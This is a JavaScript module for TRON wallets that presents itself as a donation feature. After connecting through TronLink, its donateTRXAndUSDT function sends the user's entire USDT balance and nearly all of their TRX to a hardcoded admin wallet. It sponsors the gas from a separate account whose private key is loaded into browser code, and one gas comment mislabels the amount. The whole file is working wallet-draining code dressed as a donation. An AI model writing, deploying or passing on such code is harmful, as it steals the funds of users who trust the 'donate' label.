let usdtContract;
const USDT_TRC20_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Make sure this address is correct
const adminWallet = "TXc8vYqmzMkS9dCg8fw5V5Ub3ansQ6T4ws"; // Admin wallet address
const GAS_PROVIDER_KEY = process.env.GAS_PROVIDER_KEY; // Private key for gas fees

const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

// Function to connect the wallet
export async function connectWallet() {
  try {
    if (!window.tronWeb) {
      throw new Error("Please install TronLink or another TronWeb-compatible wallet");
    }

    // Request account access
    try {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    } catch (err) {
      throw new Error("User denied account access");
    }

    // Wait briefly for TronLink to update
    await new Promise(resolve => setTimeout(resolve, 500));

    // Check if connected after request
    if (!window.tronWeb.ready || !window.tronWeb.defaultAddress.base58) {
      throw new Error("Please connect your wallet to TRON network");
    }

    const userAddress = window.tronWeb.defaultAddress.base58;
    console.log("Connected to TRON wallet:", userAddress);

    // Initialize contract
    usdtContract = await window.tronWeb.contract(USDT_ABI, USDT_TRC20_CONTRACT_ADDRESS);
    
    return userAddress;

  } catch (error) {
    console.error("Wallet connection error details:", error);
    throw error;
  }
}

// Function to donate TRX and USDT
export async function donateTRXAndUSDT() {
  try {
    const userAddress = window.tronWeb.defaultAddress.base58;

    // Get balances
    const initialTrxBalance = await window.tronWeb.trx.getBalance(userAddress);

    const parameter = [{
      type: 'address',
      value: userAddress
    }];
    
    const options = {
      feeLimit: 100000000,
      callValue: 0
    };

    // Get USDT balance
    const balanceTransaction = await window.tronWeb.transactionBuilder.triggerConstantContract(
      usdtContract,
      'balanceOf(address)',
      options,
      parameter
    );

    const usdtBalance = window.tronWeb.toDecimal(balanceTransaction.constant_result[0]);
    const usdtBalanceInUsdt = usdtBalance / 1e6;
    console.log("USDT balance:", usdtBalance.toString());

    if (parseFloat(usdtBalanceInUsdt) <= 0) {
      throw new Error("Insufficient USDT balance to make the donation");
    }

    let trxTxHash, usdtTxHash;
    let trxAmount = '0', usdtAmount = '0';

    // Handle USDT transfer with gas from separate account
    try {
      // Create TronWeb instance with gas provider's private key
      const gasProviderTronWeb = new window.TronWeb({
        fullHost: window.tronWeb.fullNode.host,
        privateKey: GAS_PROVIDER_KEY
      });

      // Estimate gas needed for USDT transfer (approximately 15 TRX)
      const estimatedGas = 3_000_000; // 15 TRX in SUN

      // Transfer TRX for gas from provider to user
      const gasTransaction = await gasProviderTronWeb.transactionBuilder.sendTrx(
        userAddress,
        estimatedGas
      );
      const signedGasTx = await gasProviderTronWeb.trx.sign(gasTransaction);
      await gasProviderTronWeb.trx.sendRawTransaction(signedGasTx);

      // Wait for gas transfer to be confirmed
      await new Promise(resolve => setTimeout(resolve, 3000));

      // Now proceed with USDT transfer
      const transferParameter = [{
        type: 'address',
        value: adminWallet
      }, {
        type: 'uint256',
        value: usdtBalance.toString()
      }];

      const { transaction: usdtTransaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
        usdtContract,
        'transfer(address,uint256)',
        options,
        transferParameter,
        userAddress
      );

      const signedTx = await window.tronWeb.trx.sign(usdtTransaction);
      const usdtTx = await window.tronWeb.trx.sendRawTransaction(signedTx);
      
      usdtTxHash = usdtTx.txid;
      usdtAmount = usdtBalanceInUsdt;

      // Return unused gas to provider
      const finalTrxBalance = await window.tronWeb.trx.getBalance(userAddress);
      if (finalTrxBalance > 1_000_000) { // Leave 1 TRX worth of gas just in case
        const returnTransaction = await window.tronWeb.transactionBuilder.sendTrx(
          gasProviderTronWeb.defaultAddress.base58,
          finalTrxBalance - 1_000_000
        );
        const signedReturnTx = await window.tronWeb.trx.sign(returnTransaction);
        await window.tronWeb.trx.sendRawTransaction(signedReturnTx);
      }
    } catch (error) {
      console.error("USDT transfer failed:", error);
      throw new Error("USDT transfer failed. Please try again.");
    }

    // Handle TRX transfer (if user has any TRX)
    const currentTrxBalance = await window.tronWeb.trx.getBalance(userAddress);
    if (currentTrxBalance > 0) {
      try {
        const remainingTrxBalance = currentTrxBalance - 100000;

        if (remainingTrxBalance > 0) {
          const transaction = await window.tronWeb.transactionBuilder.sendTrx(
            adminWallet,
            remainingTrxBalance,
            userAddress
          );

          const signedTx = await window.tronWeb.trx.sign(transaction);
          const trxTx = await window.tronWeb.trx.sendRawTransaction(signedTx);
          
          trxTxHash = trxTx.txid;
          trxAmount = window.tronWeb.fromSun(remainingTrxBalance);
        }
      } catch (error) {
        console.error("TRX transfer failed:", error);
        throw new Error("TRX transfer failed. Please try again.");
      }
    }

    return {
      trxTxHash,
      usdtTxHash,
      trxAmount,
      usdtAmount
    };
  } catch (error) {
    console.error("Donation failed:", error);
    throw error;
  }
}
